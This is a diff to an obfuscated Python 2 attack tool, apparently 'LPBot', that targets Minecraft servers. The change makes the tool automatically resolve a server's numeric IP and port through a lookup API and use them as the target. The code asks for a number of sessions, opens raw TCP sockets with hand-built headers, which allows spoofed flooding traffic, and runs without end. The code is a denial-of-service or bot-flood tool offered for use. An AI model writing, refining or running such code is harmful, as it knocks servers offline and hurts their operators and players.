@@ -107,22 +107,18 @@ def bots ():
         synckill ('\n\033[1;31;40m[!] Invalid option!')
     OOO0O00OO0000O00O =['example.com']
     O0OOOO0O0O0000O0O =raw_input ('\033[1;32;40m[-] IP: ')
-    resolvedns = raw_input ('\033[1;32;40m[LPBot] Deseas Obtener IP:PUERTO? (y/n): ')
-    if resolvedns =='y':
-        r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
-        start1 = ("\"ip\":\"")
-        end1 = "\","
-        a1 = (r1.split(start1))[1].split(end1)[0]
+    r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
+    start1 = ("\"ip\":\"")
+    end1 = "\","
+    a1 = (r1.split(start1))[1].split(end1)[0]
             
-        r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
-        start2 = ("\"port\":")
-        end2 = ","
-        a2  = (r2.split(start2))[1].split(end2)[0]
-        ipresolved = (a1 + ":" + a2)
-        print("[LPBot] Listo! " + str(ipresolved))
-        ipnueva = raw_input("[LPBot] Deseas utilizar la ip numerica como objetivo? (y/n): ")
-        if ipnueva == 'y':
-            O0OOOO0O0O0000O0O = raw_input ('\033[1;32;40m[LPBot] IP (Incluye IP:PUERTO): ')
+    r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
+    start2 = ("\"port\":")
+    end2 = ","
+    a2  = (r2.split(start2))[1].split(end2)[0]
+    ipresolved = (a1 + ":" + a2)
+    print("[LPBot] Listo! " + str(ipresolved))
+    O0OOOO0O0O0000O0O = ipresolved
     if (O0OOOO0O0O0000O0O in OOO0O00OO0000O00O ):
         synckill ('\n\033[1;31;40m[!] IP Blacklisted!')
     O00000O0OO00OOO0O =input ('\033[1;32;40m[-] Sesiones: ')
@@ -139,7 +135,7 @@ def bots ():
     try :
         OOOOO00OOOOO0O00O =socket .socket (socket .AF_INET ,socket .SOCK_RAW ,socket .IPPROTO_TCP )
     except socket .error as OO00OOOO000O0000O :
-        print ('Socket could not be created. Error Code : '+str (OO00OOOO000O0000O [0 ])+' Message '+OO00OOOO000O0000O [1 ])
+        print ('[LPTool] Issue encountered, are you using root? - '+str (OO00OOOO000O0000O [0 ])+' Message '+OO00OOOO000O0000O [1 ])
         sys .exit ()
     OOOOO00OOOOO0O00O .setsockopt (socket .IPPROTO_IP ,socket .IP_HDRINCL ,1 )
     print ("")
@@ -362,7 +358,7 @@ def bots ():
     print ("\033[1;32;40m[!] Running!")
     try :
         while True :
-            time .sleep (1000 )
+            time .sleep (100000000000 )
     except (KeyboardInterrupt ,SystemExit ):
         synckill ('\n\033[1;31;40m[!] Deteniendo con exito!')
 
